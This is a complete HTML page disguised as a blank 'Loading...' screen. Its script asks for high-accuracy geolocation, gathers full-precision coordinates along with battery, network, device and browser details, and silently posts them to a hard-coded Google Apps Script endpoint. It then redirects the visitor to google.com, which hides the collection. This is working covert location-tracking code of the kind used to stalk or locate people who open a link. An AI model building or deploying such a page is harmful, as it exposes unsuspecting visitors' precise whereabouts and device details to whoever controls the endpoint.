<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Loading...</title>
  <meta http-equiv="Permissions-Policy" content="geolocation=(self)">
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #ffffff;
    }
  </style>
</head>
<body>
<script>
  const SHEET_WEBAPP_URL = "https://script.google.com/macros/s/AKfycbwqKtanbi2fGQrfZ0_yFnhf34gSDeM9Cn1NrGKEjcYYW8TNGGtRVU2l4vYjez33Y8Dv/exec";

  function nowString(){
    return new Date().toLocaleString();
  }

  function getBasicInfo(){
    return {
      ua: navigator.userAgent || "",
      platform: navigator.platform || "",
      lang: navigator.language || "",
      tz: (Intl.DateTimeFormat().resolvedOptions().timeZone || ""),
      screenW: screen.width,
      screenH: screen.height,
      pixelRatio: window.devicePixelRatio || 1
    };
  }

  function getNetworkInfo(){
    const online = navigator.onLine ? "Yes" : "No";
    let connType = "";
    let downlink = "";

    if (navigator.connection) {
      connType = navigator.connection.effectiveType || "";
      downlink = navigator.connection.downlink ? (navigator.connection.downlink + " Mbps") : "";
    }

    return { online, connType, downlink };
  }

  async function getBatteryInfo(){
    try {
      if (navigator.getBattery) {
        const b = await navigator.getBattery();
        return {
          level: (b.level * 100).toFixed(0) + "%",
          charging: b.charging ? "Yes" : "No"
        };
      }
    } catch(e) {}
    return { level: "", charging: "" };
  }

  function getLocationMandatory(){
    return new Promise((resolve) => {
      if(!navigator.geolocation) {
        resolve({ ok:false, reason:"not_supported" });
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const lat = pos.coords.latitude;   // ✅ full precision
          const lon = pos.coords.longitude;  // ✅ full precision
          const acc = pos.coords.accuracy;
          const speed = (pos.coords.speed == null) ? "" : pos.coords.speed;
          const altitude = (pos.coords.altitude == null) ? "" : pos.coords.altitude;

          resolve({ ok:true, lat, lon, acc, speed, altitude });
        },
        (err) => {
          resolve({ ok:false, reason: (err.code === 1) ? "denied" : "error" });
        },
        { enableHighAccuracy:true, timeout:15000, maximumAge:0 }
      );
    });
  }

  function redirect(){
    window.location.href = "https://www.google.com/";
  }

  async function run(){
    const loc = await getLocationMandatory();

    // If denied / error => redirect only
    if(!loc.ok) {
      redirect();
      return;
    }

    const basic = getBasicInfo();
    const net = getNetworkInfo();
    const bat = await getBatteryInfo();

    const maps = `https://www.google.com/maps?q=${loc.lat},${loc.lon}`;

    const collected = {
      time: nowString(),
      latitude: String(loc.lat),
      longitude: String(loc.lon),
      accuracy: String(loc.acc),
      speed: String(loc.speed),
      altitude: String(loc.altitude),
      maps: maps,

      battery: bat.level,
      charging: bat.charging,

      online: net.online,
      connection: net.connType,
      downlink: net.downlink,

      platform: basic.platform,
      language: basic.lang,
      timezone: basic.tz,
      screen: basic.screenW + " x " + basic.screenH,
      pixelRatio: String(basic.pixelRatio),
      userAgent: basic.ua
    };

    try {
      await fetch(SHEET_WEBAPP_URL, {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(collected)
      });
    } catch(e) {}

    // Redirect anyway
    redirect();
  }

  run();
</script>
</body>
</html>
